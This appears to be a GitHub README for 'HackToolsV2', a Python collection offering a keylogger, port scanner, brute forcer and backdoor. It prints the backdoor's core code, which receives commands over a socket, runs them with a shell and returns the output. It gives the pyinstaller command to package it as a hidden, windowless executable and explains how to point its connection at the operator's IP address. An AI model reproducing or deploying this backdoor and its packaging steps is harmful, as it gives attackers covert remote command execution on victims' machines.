# HackToolsV2
Python Keylogger PortScanner BruteForce and basic hack tools.(new ones will(BackDoor) come soon)
![Ekran Alıntıs2ı](https://user-images.githubusercontent.com/69467096/112681821-46388780-8e80-11eb-89ab-7d1fc21476ea.PNG)
![Ekran Alıntısı](https://user-images.githubusercontent.com/69467096/112681920-66684680-8e80-11eb-8e59-552d65c3f1fb.PNG)

[![forthebadge made-with-python](http://ForTheBadge.com/images/badges/made-with-python.svg)](https://www.python.org/)

## To make exe file write this code block to terminal
```python
pyinstaller backdoor.py --onefile --noconsole
```
### Additional codes:
#command = reliable_recv()
#message = 'Hello world'
#s.send(message.encode())

#s.recv(1024)
#execute = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)

#result = execute.stdout.read() + execute.stderr.read()
#reliable_send(result)
```python
command = reliable_recv()
message = 'Hello world'
s.send(message.encode())

s.recv(1024)
execute = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)

result = execute.stdout.read() + execute.stderr.read()
reliable_send(result)
```
![Ekran Alıntısı](https://user-images.githubusercontent.com/69467096/112891291-a4fc3c00-90e0-11eb-81bd-604dd01c9b0d.PNG)
### due to some complications in server.py and backdoor.py You must replace the code blocks that write 127.0.0.1 with the local IP address.
# LIKE THIS

```python
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sck.bind(('127.0.0.1',5555))

s.connect(('127.0.0.1',5555))
```
# TO THIS
```python
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sck.bind(('192.1.2.12',5555))

s.connect(('192.1.2.12',5555))
```
# about deactivated lines of code
### some processes develop differently in your Linux and Windows operating systems.
### programs have been deactivated because some processes cannot run at the same time even if they are written in both.
### You can customize the lines of code you can also activate the startup codes I use to see if it works.

